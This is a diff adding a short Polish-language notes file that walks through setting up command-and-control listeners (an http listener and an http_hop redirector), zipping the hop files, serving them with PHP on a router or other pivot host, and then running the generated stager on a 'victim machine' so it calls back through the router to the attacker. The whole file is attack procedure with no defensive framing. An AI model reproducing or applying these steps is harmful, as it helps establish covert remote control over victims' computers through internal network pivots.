@@ -1,0 +1,27 @@
+Ustawiamy zwyklego listenera
+→ uselistener http
+   ⇒ set Name <name>
+   ⇒ set Port <port>
+   ⇒ set Host <nasze ip>
+   ⇒ execute
+
+
+Nastepnie ustawiamy http_hop
+→ uselistener http_hop
+   ⇒ set Name <name> (mozna zostawic domyslne)
+   ⇒ set Port <Port> (inny niz powyzej)
+   ⇒ set Host <ip>  (ip maszyny na ktorej ma byc przekierowanie czyli np. rountera)
+   ⇒ execute (pojawi sie kod wyzwalacza)
+
+
+Nastepnie przenosimy na server pliki przekierowujace:
+→ cd /tmp/http_hop  (w folderze tmp powinny pojawic sie nasze pliki domyslnie w http_hop)
+→ zip -r hop.zip *
+(Przenosimy zip na rounter czy inny komputer z ktorego nastapi przekierowanie)
+
+Na rounterze 
+→ unzip hop.zip
+→ php -S 0.0.0.0:<port> &>/dev/null & (port ten sam co w drugim kroku czyli taki jak na wyzwalaczu http_hop)
+
+
+I gotowe teraz mozemy uruchomic kod wyzwalajacy na maszynie ofiary polaczy sie on z rounterem w sieci prywatnej a rounter z nami :)
